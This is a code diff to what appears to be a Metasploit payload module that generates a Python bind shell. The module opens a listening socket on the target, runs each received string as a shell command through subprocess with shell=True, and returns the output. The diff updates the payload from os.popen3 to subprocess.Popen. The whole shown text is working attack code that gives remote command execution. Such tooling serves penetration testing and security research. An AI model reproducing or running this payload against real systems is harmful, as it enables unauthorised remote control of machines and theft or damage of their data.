@@ -36,9 +36,9 @@ module MetasploitModule
 
   def command_string
     cmd = ''
-    dead = Rex::Text.rand_text_alpha(2)
+    dead = Rex::Text.rand_text_alpha(3)
     # Set up the socket
-    cmd << "import socket,os\n"
+    cmd << "import socket,subprocess\n"
     cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
     cmd << "so.bind(('#{datastore['RHOST']}',#{ datastore['LPORT']}))\n"
     cmd << "so.listen(1)\n"
@@ -46,8 +46,8 @@ module MetasploitModule
     cmd << "#{dead}=False\n"
     cmd << "while not #{dead}:\n"
     cmd << "\tdata=so.recv(1024)\n"
-    cmd << "\tstdin,stdout,stderr,=os.popen3(data)\n"
-    cmd << "\tstdout_value=stdout.read()+stderr.read()\n"
+    cmd << "\tp=subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
+    cmd << "\tstdout_value=p.stdout.read()+p.stderr.read()\n"
     cmd << "\tso.send(stdout_value)\n"
 
     py_create_exec_stub(cmd)
